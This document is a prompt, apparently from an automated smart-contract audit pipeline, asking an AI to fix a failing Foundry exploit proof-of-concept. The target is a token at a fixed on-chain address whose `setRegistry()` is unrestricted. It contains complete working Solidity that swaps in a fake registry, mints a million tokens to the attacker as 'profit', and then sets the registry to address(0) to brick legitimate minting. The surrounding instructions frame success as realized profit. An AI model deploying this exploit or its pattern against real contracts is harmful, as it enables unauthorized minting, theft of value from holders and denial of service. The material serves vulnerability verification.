You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Anyone can replace the registry and grant themselves mint authority
- claim: `setRegistry()` is completely unrestricted. `mint()` trusts the current `registry` to decide whether `msg.sender` matches one of the whitelisted subsystem addresses, so any caller can first point `registry` at a malicious contract and then satisfy `_isAuthorizedAddress()` with attacker-controlled return values.
- impact: A permissionless attacker can mint arbitrary amounts of BBT, destroying scarcity and draining value from holders or any protocol that prices or collateralizes BBT. The same primitive can also brick all legitimate minting by setting `registry` to `address(0)`, an EOA, or a contract that reverts on lookup.
- exploit_paths: ["Attacker deploys a fake registry whose `getContractAddress(\"Savings\")` returns the attacker's address, calls `setRegistry(fakeRegistry)`, then calls `mint(attacker, arbitraryAmount)`.", "Attacker calls `setRegistry(address(0))` or points `registry` at a non-conforming contract, causing future `_isAuthorizedAddress()` lookups inside `mint()` to revert."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IBBToken {
    function setRegistry(address _registry) external;
    function mint(address _user, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract FakeRegistry {
    address internal immutable authorizedMinter;

    constructor(address _authorizedMinter) {
        authorizedMinter = _authorizedMinter;
    }

    function getContractAddress(string memory name) external view returns (address) {
        if (keccak256(bytes(name)) == keccak256(bytes("Savings"))) {
            return authorizedMinter;
        }

        return address(0);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x3541499cda8CA51B24724Bb8e7Ce569727406E04;
    uint256 internal constant MINT_AMOUNT = 1_000_000 ether;

    FakeRegistry internal immutable fakeRegistry;

    uint256 internal realizedProfit;
    bool internal executed;
    bool public brickConfirmed;

    constructor() {
        fakeRegistry = new FakeRegistry(address(this));
    }

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        IBBToken token = IBBToken(TARGET);
        uint256 balanceBefore = token.balanceOf(address(this));

        // Path stage 1: attacker-controlled registry replacement.
        token.setRegistry(address(fakeRegistry));

        // Path stage 2: fake registry authorizes this verifier as "Savings".
        token.mint(address(this), MINT_AMOUNT);

        uint256 balanceAfterMint = token.balanceOf(address(this));
        realizedProfit = balanceAfterMint - balanceBefore;

        // Path stage 3: demonstrate the bricking variant from the finding by
        // replacing the registry with address(0). After this, mint() reverts
        // because the token attempts a typed external call to getContractAddress()
        // on a non-contract address and cannot decode a valid return value.
        token.setRegistry(address(0));
        (bool ok,) = TARGET.call(abi.encodeWithSignature("mint(address,uint256)", address(this), 1));
        brickConfirmed = !ok;
    }

    function profitToken() external pure returns (address) {
        return TARGET;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfit;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: getcontractaddress("savings"), setregistry(fakeregistry), mint(attacker, arbitraryamount), _isauthorizedaddress(); generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
